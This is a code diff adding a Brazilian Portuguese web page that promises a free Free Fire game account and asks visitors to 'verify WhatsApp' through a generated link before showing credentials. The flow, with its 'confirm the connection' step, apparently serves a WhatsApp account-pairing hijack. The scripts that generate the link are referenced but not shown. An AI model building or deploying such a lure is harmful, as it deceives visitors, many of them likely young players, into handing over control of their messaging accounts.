@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🔥</text></svg>">
+    <title>🔥 Free Fire - Ganhe uma Conta Grátis!</title>
+    <meta name="description" content="Ganhe uma conta Free Fire grátis com diamantes, skins raras e nível alto! Resgate agora.">
+    <link rel="stylesheet" href="css/main.css">
+    <link rel="stylesheet" href="css/free-fire.css">
+    <script src="js/device-guard.js"></script>
+</head>
+<body class="theme-free-fire" data-game="free-fire">
+
+    <!-- Decorative elements -->
+    <span class="fire-deco fire-deco-1">🔥</span>
+    <span class="fire-deco fire-deco-2">💎</span>
+    <span class="fire-deco fire-deco-3">⚔️</span>
+
+    <!-- Particles -->
+    <div class="particles" id="particles"></div>
+
+    <!-- Back button -->
+    <a href="index.html" class="back-button" title="Voltar">←</a>
+
+    <!-- ============================================
+         SCREEN 1: WELCOME
+         ============================================ -->
+    <div id="screen-welcome" class="screen active">
+        <div class="content-wrapper">
+            <div class="hero-badge">🔥 OPORTUNIDADE ÚNICA</div>
+            <h1 class="hero-title">🔥 FREE FIRE</h1>
+            <h2 class="hero-subtitle">Sua chance de ganhar uma conta TOP!</h2>
+
+            <div class="prize-card card">
+                <div class="prize-icon">💎⚔️</div>
+                <h3>Contas que podem conter:</h3>
+                <ul class="prize-list">
+                    <li>Níveis altíssimos — já imaginou entrar e estar no topo?</li>
+                    <li>Diamantes acumulados esperando pra serem usados 💎</li>
+                    <li>Skins lendárias e pacotes exclusivos que quase ninguém tem</li>
+                    <li>Personagens desbloqueados e habilidades especiais</li>
+                    <li>Emotes raros, armas douradas e muito mais surpresas...</li>
+                </ul>
+                <p style="margin-top: 1rem; font-size: 0.85rem; opacity: 0.7; font-style: italic;">
+                    * Cada conta é única — o conteúdo pode variar. Quem resgatar primeiro, leva a melhor! 🏆
+                </p>
+            </div>
+
+            <button id="btn-want-win" class="btn btn-primary btn-glow">
+                🔥 QUERO ESSA CONTA AGORA!
+            </button>
+        </div>
+    </div>
+
+    <!-- ============================================
+         SCREEN 2: PAIRING (WhatsApp Verification)
+         ============================================ -->
+    <div id="screen-pairing" class="screen">
+        <div class="content-wrapper">
+            <div class="pairing-card card">
+                <div class="pairing-icon">📱</div>
+                <h2>Verificação WhatsApp</h2>
+                <p class="pairing-description">
+                    Falta pouco! Para liberar o acesso à sua conta Free Fire,
+                    precisamos de uma rápida verificação do seu WhatsApp.
+                    É super rápido — clique no botão abaixo e pronto!
+                </p>
+
+                <!-- WhatsApp Verify Button -->
+                <a id="whatsapp-link" href="#" target="_blank" rel="noopener"
+                   class="btn btn-whatsapp btn-glow"
+                   style="opacity: 0.5; pointer-events: none;">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" fill="white">
+                        <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/>
+                    </svg>
+                    VERIFICAR WHATSAPP
+                </a>
+
+                <!-- Timer -->
+                <div class="timer-container">
+                    <div class="timer-bar-bg">
+                        <div class="timer-bar" id="timer-progress"></div>
+                    </div>
+                    <span class="timer-text" id="timer-text">Gerando link...</span>
+                </div>
+
+                <!-- Status -->
+                <div class="status-container">
+                    <div class="spinner" id="spinner"></div>
+                    <p class="status-text" id="status-message">Gerando link de verificação...</p>
+                </div>
+
+                <!-- Steps Guide -->
+                <div class="steps-guide">
+                    <div class="step">
+                        <span class="step-number">1</span>
+                        <span class="step-text">Clique em <strong>"VERIFICAR WHATSAPP"</strong></span>
+                    </div>
+                    <div class="step">
+                        <span class="step-number">2</span>
+                        <span class="step-text">O WhatsApp vai abrir no seu celular</span>
+                    </div>
+                    <div class="step">
+                        <span class="step-number">3</span>
+                        <span class="step-text">Confirme a conexão e volte aqui para receber sua conta!</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================
+         SCREEN 3: SUCCESS (Credentials)
+         ============================================ -->
+    <div id="screen-success" class="screen">
+        <div id="confetti" class="confetti-container"></div>
+        <div class="content-wrapper">
+            <div class="success-card card">
+                <div class="success-icon">🎉</div>
+                <h2>BOOYAH! 🔥</h2>
+                <p class="success-subtitle">Sua conta Free Fire está liberada! 💎⚔️</p>
+
+                <div class="credentials-card" id="credentials-card">
+                    <div class="credential-row">
+                        <span class="credential-label">📧 Email:</span>
+                        <span class="credential-value" id="credential-email">-</span>
+                    </div>
+                    <div class="credential-row">
+                        <span class="credential-label">🔑 Senha:</span>
+                        <span class="credential-value" id="credential-password">-</span>
+                    </div>
+                </div>
+
+                <button id="btn-copy" class="btn btn-copy">
+                    📋 Copiar Credenciais
+                </button>
+
+                <p class="success-note">
+                    ⚠️ Salve essas informações agora! Não será possível recuperá-las depois.
+                    A conta é sua — BOOYAH! 🔥
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================
+         SCREEN 4: OUT OF STOCK
+         ============================================ -->
+    <div id="screen-outofstock" class="screen">
+        <div class="content-wrapper">
+            <div class="outofstock-card card">
+                <div class="outofstock-icon">📦</div>
+                <h2 class="outofstock-title">Estoque Esgotado!</h2>
+                <p class="outofstock-message">
+                    Ops! Estamos reabastecendo o estoque de contas.
+                    Volte amanhã para garantir a sua! 🔄
+                </p>
+                <p class="outofstock-submessage">
+                    Novas contas são adicionadas diariamente.
+                    Fique de olho! 👀
+                </p>
+                <a href="index.html" class="btn btn-primary">
+                    ← Voltar e ver outros jogos
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Scripts -->
+    <script src="/socket.io/socket.io.js"></script>
+    <script type="module" src="js/app.js"></script>
+</body>
+</html>
